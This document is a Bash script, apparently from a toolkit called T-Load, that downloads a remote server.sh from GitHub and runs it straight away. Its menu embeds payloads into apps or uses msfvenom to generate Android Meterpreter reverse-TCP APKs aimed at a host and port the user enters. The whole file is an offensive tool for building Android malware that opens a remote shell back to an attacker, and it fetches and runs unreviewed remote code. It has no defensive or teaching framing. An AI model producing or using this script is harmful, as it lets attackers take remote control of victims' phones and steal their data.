clear
curl -LO https://raw.githubusercontent.com/SathvikKS/T-Load/master/Server/version3.0/server.sh
clear
./server.sh
echo "----------------------------------"
echo "      SCRIPT BY SATHVIK K S       "
echo " PLEASE MAKE SURE THAT THE CURRENT "
echo " PATH CONTAINS METASPLOIT FRAMEWOTK"
echo "----------------------------------"
echo "Select option"
echo "1. Embed Payload"
echo "2. Create Payload"
echo "3. Launch msfconsole"
echo "4. Exit"
read -p ">|" o
metapath="$HOME/metasploit-framework"
if [ $o = "3" ]
then
cd $metapath
./msfconsole
break
elif [ $o = "1" ]
then
cd T-Embed
./tembed.sh
elif [ $o = "2" ]
then
cd $metapath
echo "Enter HOST"
read -p ">|" host1
echo "Enter PORT"
read -p ">|" port1
echo "Please enter the complete path with .apk extension"
echo "where you want to save the payload to"
read -p ">|" p2
./msfvenom -p android/meterpreter/reverse_tcp LHOST=$host1 LPORT=$port1 R > $p2
cd ..
elif [ $o = "4" ]
then
exit
else
echo "Wrong choice. Please try again"
fi
